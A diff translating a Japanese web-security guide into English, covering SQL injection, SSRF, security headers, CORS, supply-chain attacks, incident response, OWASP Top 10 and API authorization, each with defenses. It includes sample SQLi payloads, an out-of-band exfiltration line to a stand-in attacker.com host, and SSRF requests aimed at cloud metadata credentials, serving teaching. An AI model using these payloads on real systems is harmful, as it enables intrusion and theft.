   SQL: SELECT * FROM users WHERE name = '' OR 1=1 --'
-  → 全ユーザーのデータが返される
+  → Returns all users' data
 
-  高度な攻撃:
-  ① UNION ベース:
-     入力: ' UNION SELECT username, password FROM users --
-     → 別テーブルのデータを取得
+  Advanced attacks:
+  ① UNION-based:
+     Input: ' UNION SELECT username, password FROM users --
+     → Retrieves data from another table
 
-  ② Blind SQLi（ブールベース）:
-     入力: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
-     → 1文字ずつパスワードを特定
+  ② Blind SQLi (boolean-based):
+     Input: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
+     → Identifies the password one character at a time
 
   ③ Time-based Blind:
-     入力: ' AND IF(1=1, SLEEP(5), 0) --
-     → レスポンス時間の差で情報を推測
+     Input: ' AND IF(1=1, SLEEP(5), 0) --
+     → Infers information from response time differences
 
   ④ Out-of-band:
-     入力: '; EXEC xp_dirtree '//attacker.com/share' --
-     → サーバーから攻撃者への通信を発生させてデータ送出
+     Input: '; EXEC xp_dirtree '//attacker.com/share' --
+     → Triggers outbound communication from server to attacker to exfiltrate data
 
-  防御:
-  ✓ パラメータ化クエリ（Prepared Statement）
-  ✓ ORM の使用
-  ✓ 入力のバリデーション（ホワイトリスト）
-  ✗ 文字列連結でSQLを構築しない
-  ✗ ブラックリスト方式のフィルタリングは不十分
+  Defenses:
+  ✓ Parameterized queries (Prepared Statements)
+  ✓ Use an ORM
+  ✓ Input validation (whitelist)
+  ✗ Do not build SQL by string concatenation
+  ✗ Blacklist-based filtering is insufficient
 ```
 
 ```python
-# SQLインジェクション対策（Python）
+# SQL injection countermeasures (Python)
 
-# 脆弱なコード（絶対にNG）
+# Vulnerable code (absolutely do NOT do this)
 def get_user_vulnerable(username: str):
     query = f"SELECT * FROM users WHERE username = '{username}'"
-    cursor.execute(query)  # SQLインジェクション可能！
+    cursor.execute(query)  # SQL injection possible!
 
-# 安全なコード（Prepared Statement）
+# Safe code (Prepared Statement)
 def get_user_safe(username: str):
     query = "SELECT * FROM users WHERE username = %s"
-    cursor.execute(query, (username,))  # パラメータ化
+    cursor.execute(query, (username,))  # Parameterized
 
-# SQLAlchemy ORM（推奨）
+# SQLAlchemy ORM (recommended)
 from sqlalchemy import select
 from sqlalchemy.orm import Session
 
@@ -759,99 +759,99 @@ def get_user_orm(session: Session, username: str):
     stmt = select(User).where(User.username == username)
     return session.execute(stmt).scalar_one_or_none()
 
-# 動的クエリが必要な場合（ソート等）
+# When dynamic queries are needed (e.g., sorting)
 ALLOWED_SORT_COLUMNS = {"name", "created_at", "email"}
 ALLOWED_SORT_ORDERS = {"asc", "desc"}
 
 def get_users_sorted(sort_by: str, order: str):
-    # ホワイトリスト検証
+    # Whitelist validation
     if sort_by not in ALLOWED_SORT_COLUMNS:
         raise ValueError(f"Invalid sort column: {sort_by}")
     if order not in ALLOWED_SORT_ORDERS:
         raise ValueError(f"Invalid sort order: {order}")
 
-    # 検証済みの値のみ使用
+    # Use only validated values
     query = f"SELECT * FROM users ORDER BY {sort_by} {order}"
     cursor.execute(query)
 ```
 
-### 4.4 SSRF（Server-Side Request Forgery）
+### 4.4 SSRF (Server-Side Request Forgery)
 
 ```
-SSRF（Server-Side Request Forgery）:
-  → サーバーに内部リソースへのリクエストを実行させる
+SSRF (Server-Side Request Forgery):
+  → Makes the server send requests to internal resources
 
-  攻撃例:
+  Attack examples:
   GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
-  → AWSメタデータからIAMクレデンシャルを窃取
+  → Steals IAM credentials from AWS metadata
 
   GET /api/fetch?url=http://localhost:6379/
-  → 内部のRedisに直接アクセス
+  → Directly accesses internal Redis
 
   GET /api/fetch?url=http://10.0.0.1/admin/
-  → 内部ネットワークの管理画面にアクセス
+  → Accesses internal network admin panel
 
-  バイパステクニック:
-  → 127.0.0.1 の代替: 0x7f000001, 2130706433, 0177.0.0.1
-  → localhost の代替: 127.0.0.1, [::1], 0.0.0.0
-  → DNS rebinding: 最初はパブリックIP、後で内部IPに変更
-  → URL パース差異: http://evil.com\@internal/
+  Bypass techniques:
+  → Alternatives to 127.0.0.1: 0x7f000001, 2130706433, 0177.0.0.1
+  → Alternatives to localhost: 127.0.0.1, [::1], 0.0.0.0
+  → DNS rebinding: first resolves to public IP, then changes to internal IP
+  → URL parsing differences: http://evil.com\@internal/
 
-  防御:
-  ✓ URLのホワイトリスト検証
-  ✓ 内部IPアドレスへのリクエストをブロック
-  ✓ IMDSv2 の使用（AWS）— トークンベースのメタデータアクセス
-  ✓ DNS解決後のIPアドレス検証
-  ✓ ネットワークレベルの制限（ファイアウォール）
-  ✓ ssrf-filter等のライブラリ使用
+  Defenses:
+  ✓ Whitelist URL validation
+  ✓ Block requests to internal IP addresses
+  ✓ Use IMDSv2 (AWS) — token-based metadata access
+  ✓ Validate IP address after DNS resolution
+  ✓ Network-level restrictions (firewall)
+  ✓ Use libraries such as ssrf-filter
 ```
 
 ```python
-# SSRF対策実装（Python）
+# SSRF countermeasure implementation (Python)
 import ipaddress
 import socket
 from urllib.parse import urlparse
 
 BLOCKED_IP_RANGES = [
-    ipaddress.ip_network('10.0.0.0/8'),       # プライベート
-    ipaddress.ip_network('172.16.0.0/12'),     # プライベート
-    ipaddress.ip_network('192.168.0.0/16'),    # プライベート
-    ipaddress.ip_network('127.0.0.0/8'),       # ループバック
-    ipaddress.ip_network('169.254.0.0/16'),    # リンクローカル（メタデータ）
-    ipaddress.ip_network('0.0.0.0/8'),         # 自ネットワーク
-    ipaddress.ip_network('::1/128'),           # IPv6ループバック
-    ipaddress.ip_network('fc00::/7'),          # IPv6プライベート
-    ipaddress.ip_network('fe80::/10'),         # IPv6リンクローカル
+    ipaddress.ip_network('10.0.0.0/8'),       # Private
+    ipaddress.ip_network('172.16.0.0/12'),     # Private
+    ipaddress.ip_network('192.168.0.0/16'),    # Private
+    ipaddress.ip_network('127.0.0.0/8'),       # Loopback
+    ipaddress.ip_network('169.254.0.0/16'),    # Link-local (metadata)
+    ipaddress.ip_network('0.0.0.0/8'),         # This network
+    ipaddress.ip_network('::1/128'),           # IPv6 loopback
+    ipaddress.ip_network('fc00::/7'),          # IPv6 private
+    ipaddress.ip_network('fe80::/10'),         # IPv6 link-local
 ]
 
 ALLOWED_SCHEMES = {'http', 'https'}
 ALLOWED_PORTS = {80, 443, 8080, 8443}
 
 def validate_url(url: str) -> bool:
-    """SSRFを防ぐURLバリデーション"""
+    """URL validation to prevent SSRF"""
     try:
         parsed = urlparse(url)
 
-        # スキーム検証
+        # Scheme validation
         if parsed.scheme not in ALLOWED_SCHEMES:
             return False
 
-        # ポート検証
+        # Port validation
         port = parsed.port or (443 if parsed.scheme == 'https' else 80)
         if port not in ALLOWED_PORTS:
             return False
 
-        # ホスト名解決
+        # Hostname resolution
         hostname = parsed.hostname
         if not hostname:
             return False
 
-        # DNS解決してIPアドレスを取得
+        # Resolve DNS to get IP address
         resolved_ips = socket.getaddrinfo(hostname, port)
         for family, socktype, proto, canonname, sockaddr in resolved_ips:
             ip = ipaddress.ip_address(sockaddr[0])
 
-            # プライベートIP範囲チェック
+            # Check against blocked IP ranges
             for blocked_range in BLOCKED_IP_RANGES:
                 if ip in blocked_range:
                     return False
@@ -861,7 +861,7 @@ def validate_url(url: str) -> bool:
     except (ValueError, socket.gaierror):
         return False
 
-# 使用例
+# Usage example
 @app.get("/api/fetch")
 async def fetch_url(url: str):
     if not validate_url(url):
@@ -869,7 +869,7 @@ async def fetch_url(url: str):
             status_code=400,
             detail="URL not allowed"
         )
-    # 安全なURLのみフェッチ
+    # Fetch only safe URLs
     async with httpx.AsyncClient() as client:
         response = await client.get(url, follow_redirects=False)
     return response.json()
@@ -877,13 +877,13 @@ async def fetch_url(url: str):
 
 ---
 
-## 5. セキュリティヘッダー
+## 5. Security Headers
 
 ```
-推奨するHTTPセキュリティヘッダー:
+Recommended HTTP security headers:
 
-① Content-Security-Policy（CSP）:
-  → XSS対策の最重要ヘッダー
+① Content-Security-Policy (CSP):
+  → The most important header for XSS defense
   Content-Security-Policy:
     default-src 'self';
     script-src 'self' 'nonce-abc123';
@@ -898,33 +898,33 @@ async def fetch_url(url: str):
     form-action 'self';
     upgrade-insecure-requests;
 
-  CSP報告:
+  CSP reporting:
   Content-Security-Policy-Report-Only: ...
   report-uri /api/csp-report;
-  → 違反時にレポートを送信（ブロックはしない）
-  → 段階的導入に有効
+  → Sends a report on violation (does not block)
+  → Useful for gradual adoption
 
 ② X-Frame-Options:
-  → クリックジャッキング対策
+  → Clickjacking defense
   X-Frame-Options: DENY
-  → frame-ancestors 'none' (CSP) と併用推奨
+  → Recommended to use together with frame-ancestors 'none' (CSP)
 
 ③ X-Content-Type-Options:
-  → MIMEタイプスニッフィング対策
+  → MIME type sniffing defense
   X-Content-Type-Options: nosniff
-  → ブラウザがContent-Typeを推測しない
+  → Browser does not guess Content-Type
 
 ④ Strict-Transport-Security:
-  → HTTPS強制
+  → Enforces HTTPS
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 
 ⑤ Referrer-Policy:
-  → Referrer情報の制限
+  → Restricts Referer information
   Referrer-Policy: strict-origin-when-cross-origin
-  → 同一オリジン: 完全URL、クロスオリジン: オリジンのみ
+  → Same origin: full URL, cross-origin: origin only
 
-⑥ Permissions-Policy（旧Feature-Policy）:
-  → ブラウザ機能の制限
+⑥ Permissions-Policy (formerly Feature-Policy):
+  → Restricts browser features
   Permissions-Policy:
     camera=(),
     microphone=(),
@@ -935,30 +935,30 @@ async def fetch_url(url: str):
     gyroscope=(),
     accelerometer=()
 
-⑦ Cross-Origin-Opener-Policy（COOP）:
+⑦ Cross-Origin-Opener-Policy (COOP):
   Cross-Origin-Opener-Policy: same-origin
-  → Spectre攻撃対策
+  → Defense against Spectre attacks
 
-⑧ Cross-Origin-Embedder-Policy（COEP）:
+⑧ Cross-Origin-Embedder-Policy (COEP):
   Cross-Origin-Embedder-Policy: require-corp
-  → SharedArrayBuffer等の使用に必要
+  → Required to use SharedArrayBuffer, etc.
 
-⑨ Cross-Origin-Resource-Policy（CORP）:
+⑨ Cross-Origin-Resource-Policy (CORP):
   Cross-Origin-Resource-Policy: same-site
-  → クロスオリジンでのリソース埋め込みを制限
+  → Restricts cross-origin embedding of resources
 ```
 
 ```nginx
-# Nginx セキュリティヘッダー設定
+# Nginx security header configuration
 server {
     # CSP
     add_header Content-Security-Policy
       "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;
 
-    # クリックジャッキング
+    # Clickjacking
     add_header X-Frame-Options "DENY" always;
 
-    # MIMEスニッフィング
+    # MIME sniffing
     add_header X-Content-Type-Options "nosniff" always;
 
     # HSTS
@@ -968,7 +968,7 @@ server {
     # Referrer
     add_header Referrer-Policy "strict-origin-when-cross-origin" always;
 
-    # 機能制限
+    # Feature restrictions
     add_header Permissions-Policy
       "camera=(), microphone=(), geolocation=(), payment=()" always;
 
@@ -976,14 +976,14 @@ server {
     add_header Cross-Origin-Opener-Policy "same-origin" always;
     add_header Cross-Origin-Resource-Policy "same-site" always;
 
-    # X-Powered-By等の不要ヘッダー削除
+    # Remove unnecessary headers like X-Powered-By
     proxy_hide_header X-Powered-By;
     server_tokens off;
 }
 ```
 
 ```
-確認ツール:
+Verification tools:
   → https://securityheaders.com/
   → https://observatory.mozilla.org/
   → Chrome DevTools → Network → Response Headers
@@ -992,315 +992,315 @@ server {
 
 ---
 
-## 6. セキュリティ設計の原則
+## 6. Principles of Security Design
 
 ```
-① 多層防御（Defense in Depth）:
-  → 1つの防御が破られても次の層で防ぐ
-  → WAF → ファイアウォール → アプリ → DB
+① Defense in Depth:
+  → If one layer is breached, the next layer stops the attacker
+  → WAF → Firewall → App → DB
 
-  例（SQLインジェクション対策）:
-  Layer 1: WAFでSQLインジェクションパターンをフィルタ
-  Layer 2: アプリで入力バリデーション
-  Layer 3: Prepared Statementでパラメータ化
-  Layer 4: DBユーザーの権限を最小限に（SELECT ONLYなど）
-  → 1つの層が突破されても次の層で防御
+  Example (SQL injection defense):
+  Layer 1: WAF filters SQL injection patterns
+  Layer 2: App validates input
+  Layer 3: Parameterized queries
+  Layer 4: Minimize DB user privileges (SELECT ONLY, etc.)
+  → Even if one layer is breached, the next layer defends
 
-② 最小権限の原則（Least Privilege）:
-  → 必要最小限の権限のみ付与
-  → IAMポリシー、DBユーザー権限
+② Principle of Least Privilege:
+  → Grant only the minimum necessary privileges
+  → IAM policies, DB user privileges
 
-  例:
-  → APIサーバーのDBユーザー: SELECT, INSERT, UPDATE のみ（DELETE不可）
-  → Lambda関数: 必要なS3バケットのみアクセス可能
-  → Kubernetes Pod: 必要なSecretのみマウント
+  Examples:
+  → API server DB user: SELECT, INSERT, UPDATE only (no DELETE)
+  → Lambda function: access only the necessary S3 buckets
+  → Kubernetes Pod: mount only the necessary Secrets
 
-③ ゼロトラスト（Zero Trust）:
-  → 「内部ネットワークだから安全」を前提としない
-  → 常に認証・認可を要求
+③ Zero Trust:
+  → Do not assume "internal network = safe"
+  → Always require authentication and authorization
   → "Never trust, always verify"
 
-  従来:  社内ネットワーク = 信頼 → VPNで社内に入れば何でもアクセス
-  ゼロトラスト: 全リクエストを検証 → mTLS + JWT + ポリシーエンジン
+  Traditional: Internal network = trusted → once inside via VPN, access everything
+  Zero Trust: Verify every request → mTLS + JWT + policy engine
 
-  実装要素:
-  → アイデンティティ基盤（IdP）
-  → デバイス認証・評価
-  → マイクロセグメンテーション
-  → 継続的な検証（セッション中も）
+  Implementation elements:
+  → Identity provider (IdP)
+  → Device authentication and assessment
+  → Microsegmentation
+  → Continuous verification (even during sessions)
 
-④ フェイルセキュア:
-  → エラー時は安全な状態にフォールバック
-  → 認証エラー → アクセス拒否（許可ではない）
-  → 設定エラー → デフォルト拒否
+④ Fail Secure:
+  → Fall back to a safe state on error
+  → Authentication error → deny access (not grant)
+  → Configuration error → deny by default
 
-⑤ 入力の検証:
-  → 全ての外部入力を信頼しない
-  → バリデーション: 形式・範囲のチェック
-  → サニタイズ: 危険な文字の除去/エスケープ
-  → 正規化: Unicode正規化、パストラバーサル対策
+⑤ Input Validation:
+  → Do not trust any external input
+  → Validation: check format and range
+  → Sanitization: remove/escape dangerous characters
+  → Normalization: Unicode normalization, path traversal defense
 
-⑥ セキュリティの可視化:
-  → 全てのアクセスをログに記録
-  → 異常検知（SIEM）
-  → アラート通知
-  → 定期的な監査
+⑥ Security Visibility:
+  → Log all access
+  → Anomaly detection (SIEM)
+  → Alert notifications
+  → Regular audits
 ```
 
 ---
 
-## 7. CORS（Cross-Origin Resource Sharing）
+## 7. CORS (Cross-Origin Resource Sharing)
 
 ```
 CORS:
-  → 異なるオリジン間でのリソース共有を制御
-  → ブラウザのセキュリティ機能（Same-Origin Policy）を緩和
+  → Controls resource sharing between different origins
+  → Relaxes the browser's security feature (Same-Origin Policy)
 
 Same-Origin Policy:
-  → 同じオリジン（スキーム + ホスト + ポート）のみリクエスト許可
-  → https://app.example.com → https://api.example.com は異なるオリジン
+  → Allows requests only to the same origin (scheme + host + port)
+  → https://app.example.com → https://api.example.com are different origins
 
-CORSのフロー:
+CORS flow:
 
-① Simple Request（プリフライトなし）:
-  → GET, HEAD, POST（一部Content-Type）
-  → カスタムヘッダーなし
+① Simple Request (no preflight):
+  → GET, HEAD, POST (some Content-Types)
+  → No custom headers
 
-  ブラウザ → APIサーバー:
+  Browser → API server:
     GET /api/data
     Origin: https://app.example.com
 
-  APIサーバー → ブラウザ:
+  API server → Browser:
     Access-Control-Allow-Origin: https://app.example.com
-    → ブラウザがOriginとAllow-Originを照合
+    → Browser compares Origin with Allow-Origin
 
-② Preflight Request（プリフライトあり）:
-  → PUT, DELETE, カスタムヘッダー等
-  → OPTIONSリクエストで事前確認
+② Preflight Request:
+  → PUT, DELETE, custom headers, etc.
+  → Pre-check with an OPTIONS request
 
-  ブラウザ → APIサーバー:
+  Browser → API server:
     OPTIONS /api/data
     Origin: https://app.example.com
     Access-Control-Request-Method: PUT
     Access-Control-Request-Headers: Authorization, Content-Type
 
-  APIサーバー → ブラウザ:
+  API server → Browser:
     Access-Control-Allow-Origin: https://app.example.com
     Access-Control-Allow-Methods: GET, POST, PUT, DELETE
     Access-Control-Allow-Headers: Authorization, Content-Type
-    Access-Control-Max-Age: 86400  ← プリフライトキャッシュ
+    Access-Control-Max-Age: 86400  ← preflight cache
 
-CORSのセキュリティ注意:
+CORS security notes:
   ✗ Access-Control-Allow-Origin: * + credentials
-     → Cookie/認証ヘッダーの送信不可
-  ✓ 許可するオリジンを明示的に指定
-  ✗ リクエストのOriginヘッダーをそのまま反射しない
-     → 任意のオリジンが許可されてしまう
+     → Cannot send cookies/auth headers
+  ✓ Explicitly specify allowed origins
+  ✗ Do not reflect the request's Origin header directly
+     → Would allow any origin
 ```
 
 ```python
-# CORS設定（Python / FastAPI）
+# CORS configuration (Python / FastAPI)
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 
 app = FastAPI()
 
-# 許可するオリジンのリスト
+# List of allowed origins
 ALLOWED_ORIGINS = [
     "https://app.example.com",
     "https://admin.example.com",
 ]
 
-# 開発環境のみ追加
+# Add only for development environment
 import os
 if os.getenv("ENV") == "development":
     ALLOWED_ORIGINS.append("http://localhost:3000")
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=ALLOWED_ORIGINS,       # 許可するオリジン
-    allow_credentials=True,              # Cookie/認証ヘッダーの送信許可
-    allow_methods=["GET", "POST", "PUT", "DELETE"],  # 許可するHTTPメソッド
-    allow_headers=["Authorization", "Content-Type"],   # 許可するヘッダー
-    expose_headers=["X-Request-Id"],     # クライアントに公開するレスポンスヘッダー
-    max_age=86400,                       # プリフライトキャッシュ（秒）
+    allow_origins=ALLOWED_ORIGINS,       # Allowed origins
+    allow_credentials=True,              # Allow sending cookies/auth headers
+    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Allowed HTTP methods
+    allow_headers=["Authorization", "Content-Type"],   # Allowed headers
+    expose_headers=["X-Request-Id"],     # Response headers exposed to client
+    max_age=86400,                       # Preflight cache (seconds)
 )
 ```
 
 ---
 
-## 8. サプライチェーン攻撃
+## 8. Supply Chain Attacks
 
 ```
-サプライチェーン攻撃:
-  → 依存ライブラリや開発ツールを経由した攻撃
+Supply chain attacks:
+  → Attacks via dependent libraries or development tools
 
-  事例:
-  ① event-stream（2018）:
-     → npmパッケージにマルウェアが混入
-     → 暗号通貨ウォレットの窃取を目的
+  Examples:
+  ① event-stream (2018):
+     → Malware injected into an npm package
+     → Targeted at stealing cryptocurrency wallets
 
-  ② SolarWinds（2020）:
-     → ビルドシステムにバックドアを挿入
-     → 更新を通じて18,000組織に配布
+  ② SolarWinds (2020):
+     → Backdoor inserted into the build system
+     → Distributed to 18,000 organizations via updates
 
-  ③ ua-parser-js（2021）:
-     → 人気npmパッケージのアカウント乗っ取り
-     → 暗号マイナーとパスワード窃取ツールを含む版を公開
+  ③ ua-parser-js (2021):
+     → Account takeover of a popular npm package
+     → Published a version containing a crypto miner and password stealer
 
-  ④ Log4Shell（2021）:
-     → Log4jの脆弱性（CVE-2021-44228）
-     → JNDI Injection によるRCE
+  ④ Log4Shell (2021):
+     → Vulnerability in Log4j (CVE-2021-44228)
+     → RCE via JNDI Injection
 
-  防御策:
-  ✓ 依存パッケージの監査
+  Defenses:
+  ✓ Audit dependency packages
      npm audit / yarn audit / pip-audit
-  ✓ ロックファイルの使用（package-lock.json, Pipfile.lock）
-  ✓ 依存パッケージの固定（^ → = へ）
-  ✓ Dependabot / Renovate で自動更新
-  ✓ SCA（Software Composition Analysis）ツール
+  ✓ Use lock files (package-lock.json, Pipfile.lock)
+  ✓ Pin dependency versions (^ → =)
+  ✓ Automatic updates with Dependabot / Renovate
+  ✓ SCA (Software Composition Analysis) tools
      Snyk, Trivy, Grype
-  ✓ SBOMの生成と管理
-  ✓ 署名の検証（Sigstore, npm provenance）
-  ✓ プライベートレジストリの利用
+  ✓ Generate and manage SBOMs
+  ✓ Verify signatures (Sigstore, npm provenance)
+  ✓ Use private registries
 ```
 
 ---
 
-## 9. インシデント対応
+## 9. Incident Response
 
 ```
-インシデント対応フロー:
+Incident response flow:
 
-  ① 検知（Detection）:
-     → 監視アラート、ログ分析、ユーザー報告
-     → SIEM（Security Information and Event Management）
-     → 異常トラフィックパターンの検出
+  ① Detection:
+     → Monitoring alerts, log analysis, user reports
+     → SIEM (Security Information and Event Management)
+     → Detection of abnormal traffic patterns
 
-  ② トリアージ（Triage）:
-     → 影響範囲の特定
-     → 重要度の分類（P1〜P4）
-     → 対応チームの招集
+  ② Triage:
+     → Identify scope of impact
+     → Classify severity (P1–P4)
+     → Assemble response team
 
-  ③ 封じ込め（Containment）:
-     → 被害拡大の防止
-     → 侵害されたアカウントの無効化
-     → 影響を受けたサービスの隔離
-     → ネットワークセグメントの切断
+  ③ Containment:
+     → Prevent spread of damage
+     → Disable compromised accounts
+     → Isolate affected services
+     → Disconnect network segments
 
-  ④ 根本原因分析（Root Cause Analysis）:
-     → ログの詳細調査
-     → 攻撃経路の特定
-     → タイムラインの再構成
+  ④ Root Cause Analysis:
+     → Detailed log investigation
+     → Identify attack vector
+     → Reconstruct timeline
 
-  ⑤ 復旧（Recovery）:
-     → パッチ適用
-     → パスワード/鍵のローテーション
-     → サービスの段階的復旧
-     → 監視の強化
+  ⑤ Recovery:
+     → Apply patches
+     → Rotate passwords/keys
+     → Gradual service restoration
+     → Strengthen monitoring
 
-  ⑥ 事後対応（Post-Incident）:
-     → インシデントレポートの作成
-     → 振り返り（ポストモーテム）
-     → 再発防止策の実施
-     → セキュリティポリシーの更新
+  ⑥ Post-Incident:
+     → Write incident report
+     → Post-mortem review
+     → Implement recurrence prevention measures
+     → Update security policies
 
-セキュリティログの設計:
-  記録すべきイベント:
-  → 認証の成功/失敗
-  → 認可の拒否
-  → 入力バリデーション失敗
-  → アプリケーションエラー
-  → 管理者操作
-  → データアクセス（読み取り/変更/削除）
+Security log design:
+  Events to record:
+  → Authentication success/failure
+  → Authorization denial
+  → Input validation failure
+  → Application errors
+  → Admin operations
+  → Data access (read/modify/delete)
 
-  ログに含めるべき情報:
-  → タイムスタンプ（UTC）
-  → イベント種類
-  → ソースIP、ユーザーID
-  → リクエストパス、メソッド
-  → ステータスコード
+  Information to include in logs:
+  → Timestamp (UTC)
+  → Event type
+  → Source IP, user ID
+  → Request path, method
+  → Status code
   → User-Agent
 
-  ログに含めてはいけない情報:
-  → パスワード（ハッシュ化前）
-  → セッショントークン
-  → クレジットカード番号
-  → 個人識別情報（PII）のうち不要なもの
+  Information NOT to include in logs:
+  → Passwords (before hashing)
+  → Session tokens
+  → Credit card numbers
+  → Unnecessary PII (personally identifiable information)
 ```
 
 ---
 
-## 10. OWASP Top 10（2021）
+## 10. OWASP Top 10 (2021)
 
 ```
-OWASP Top 10 Web Application Security Risks（2021）:
+OWASP Top 10 Web Application Security Risks (2021):
 
-  A01: Broken Access Control（アクセス制御の不備）
-    → 権限チェックの漏れ、IDOR
-    → 対策: 認可チェックの一元化、テスト
+  A01: Broken Access Control
+    → Missing authorization checks, IDOR
+    → Defense: Centralize authorization checks, testing
 
-  A02: Cryptographic Failures（暗号化の失敗）
-    → 機密データの平文送信/保存
-    → 対策: TLS必須化、適切な暗号化
+  A02: Cryptographic Failures
+    → Transmitting/storing sensitive data in plaintext
+    → Defense: Enforce TLS, appropriate encryption
 
-  A03: Injection（インジェクション）
-    → SQLi, XSS, コマンドインジェクション
-    → 対策: パラメータ化、エスケープ、WAF
+  A03: Injection
+    → SQLi, XSS, command injection
+    → Defense: Parameterization, escaping, WAF
 
-  A04: Insecure Design（安全でない設計）
-    → 設計段階でのセキュリティ欠如
-    → 対策: 脅威モデリング、セキュアデザインパターン
+  A04: Insecure Design
+    → Lack of security consideration at design stage
+    → Defense: Threat modeling, secure design patterns
 
-  A05: Security Misconfiguration（セキュリティの設定ミス）
-    → デフォルト設定、不要な機能の有効化
-    → 対策: ハードニング、定期的な設定レビュー
+  A05: Security Misconfiguration
+    → Default settings, unnecessary features enabled
+    → Defense: Hardening, regular configuration reviews
 
-  A06: Vulnerable and Outdated Components（脆弱なコンポーネント）
-    → 既知の脆弱性を持つライブラリの使用
-    → 対策: 依存管理、SCA、自動更新
+  A06: Vulnerable and Outdated Components
+    → Using libraries with known vulnerabilities
+    → Defense: Dependency management, SCA, auto-updates
 
-  A07: Identification and Authentication Failures（認証の失敗）
-    → ブルートフォース、弱いパスワード、セッション管理不備
-    → 対策: MFA、レート制限、安全なセッション管理
+  A07: Identification and Authentication Failures
+    → Brute force, weak passwords, poor session management
+    → Defense: MFA, rate limiting, secure session management
 
-  A08: Software and Data Integrity Failures（ソフトウェア/データの整合性）
-    → サプライチェーン攻撃、CI/CDパイプラインの侵害
-    → 対策: 署名検証、SBOM、コードレビュー
+  A08: Software and Data Integrity Failures
+    → Supply chain attacks, CI/CD pipeline compromise
+    → Defense: Signature verification, SBOM, code review
 
-  A09: Security Logging and Monitoring Failures（ログ/監視の不備）
-    → 攻撃の検知ができない
-    → 対策: 包括的なログ、SIEM、アラート
+  A09: Security Logging and Monitoring Failures
+    → Unable to detect attacks
+    → Defense: Comprehensive logging, SIEM, alerts
 
-  A10: Server-Side Request Forgery（SSRF）
-    → 内部リソースへの不正アクセス
-    → 対策: URLバリデーション、ネットワーク制限
+  A10: Server-Side Request Forgery (SSRF)
+    → Unauthorized access to internal resources
+    → Defense: URL validation, network restrictions
 ```
 
 ---
 
-## 11. APIセキュリティの実践
+## 11. Practical API Security
 
-### 11.1 API認証・認可の攻撃と防御
+### 11.1 API Authentication/Authorization Attacks and Defenses
 
 ```
-API特有の攻撃パターン:
+API-specific attack patterns:
 
-① Broken Object Level Authorization（BOLA / IDOR）:
-  → 他ユーザーのリソースに直接アクセス
+① Broken Object Level Authorization (BOLA / IDOR):
+  → Directly accesses another user's resource
 
-  攻撃例:
-  GET /api/users/123/orders   ← 正規ユーザー（ID: 123）
-  GET /api/users/124/orders   ← IDを変更するだけで他人の注文を閲覧
+  Attack example:
+  GET /api/users/123/orders   ← legitimate user (ID: 123)
+  GET /api/users/124/orders   ← just changing ID reveals another user's orders
 
-  防御:
-  // ミドルウェアでオブジェクトレベルの認可チェック
+  Defense:
+  // Object-level authorization check in middleware
   async function authorizeResourceAccess(req, res, next) {
     const requestedUserId = parseInt(req.params.userId);
     const authenticatedUserId = req.user.id;
 
     if (requestedUserId !== authenticatedUserId) {
-      // 管理者権限チェック
+      // Check admin privilege
       if (!req.user.roles.includes('admin')) {
         return res.status(403).json({
           error: 'Forbidden',
@@ -1311,22 +1311,22 @@ API特有の攻撃パターン:
     next();
   }
 
-  // ルートに適用
+  // Apply to route
   app.get('/api/users/:userId/orders',
     authenticate,
     authorizeResourceAccess,
     getOrders
   );
 
-② Broken Function Level Authorization（BFLA）:
-  → 管理者APIに一般ユーザーがアクセス
+② Broken Function Level Authorization (BFLA):
+  → General user accesses admin API
 
-  攻撃例:
-  POST /api/admin/users/delete   ← 管理者エンドポイントを直接呼び出し
-  PUT /api/users/123/role        ← 自分のロールを昇格
+  Attack example:
+  POST /api/admin/users/delete   ← directly calls admin endpoint
+  PUT /api/users/123/role        ← escalates own role
 
-  防御:
-  // ロールベースのアクセス制御ミドルウェア
+  Defense:
+  // Role-based access control middleware
   function requireRole(...roles) {
     return (req, res, next) => {
       if (!roles.some(role => req.user.roles.includes(role))) {
@@ -1349,20 +1349,20 @@ API特有の攻撃パターン:
     deleteUser
   );
 
-③ Mass Assignment（一括代入攻撃）:
-  → リクエストボディに意図しないフィールドを含める
+③ Mass Assignment:
+  → Includes unintended fields in the request body
 
-  攻撃例:
+  Attack example:
   PUT /api/users/123
   {
     "name": "Taro",
     "email": "taro@example.com",
-    "role": "admin",           ← 追加フィールド
-    "is_verified": true         ← 追加フィールド
+    "role": "admin",           ← added field
+    "is_verified": true         ← added field
   }
 
-  防御:
-  // ホワイトリスト方式でフィールドを制限
+  Defense:
+  // Restrict fields using a whitelist approach
   const allowedFields = ['name', 'email', 'avatar_url'];
 
   function sanitizeInput(body, allowedFields) {
@@ -1382,28 +1382,28 @@ API特有の攻撃パターン:
   });
 ```
 
-### 11.2 レート制限の実装パターン
+### 11.2 Rate Limiting Implementation Patterns
 
 ```
-レート制限の階層設計:
+Hierarchical rate limiting design:
 
-① グローバルレート制限:
-  → 全エンドポイントに適用
+① Global rate limit:
+  → Applied to all endpoints
   → 1000 req/min per IP
 
-② エンドポイント別レート制限:
-  → 認証エンドポイント: 5 req/min
-  → 検索API: 30 req/min
-  → 一般API: 100 req/min
+② Per-endpoint rate limit:
+  → Auth endpoints: 5 req/min
+  → Search API: 30 req/min
+  → General API: 100 req/min
 
-③ ユーザー別レート制限:
-  → 無料プラン: 100 req/hour
-  → 有料プラン: 10,000 req/hour
-  → エンタープライズ: 100,000 req/hour
+③ Per-user rate limit:
+  → Free plan: 100 req/hour
+  → Paid plan: 10,000 req/hour
+  → Enterprise: 100,000 req/hour
 ```
 
 ```javascript
-// Token Bucket アルゴリズムによるレート制限（Redis使用）
+// Token Bucket algorithm rate limiting (using Redis)
 const Redis = require('ioredis');
 const redis = new Redis();
 
@@ -1411,18 +1411,18 @@ async function tokenBucketRateLimit(key, maxTokens, refillRate, refillInterval) 
   const now = Date.now();
   const bucketKey = `ratelimit:${key}`;
 
-  // Luaスクリプトでアトミックに処理
+  // Process atomically with a Lua script
   const luaScript = `
     local bucket = redis.call('HMGET', KEYS[1], 'tokens', 'last_refill')
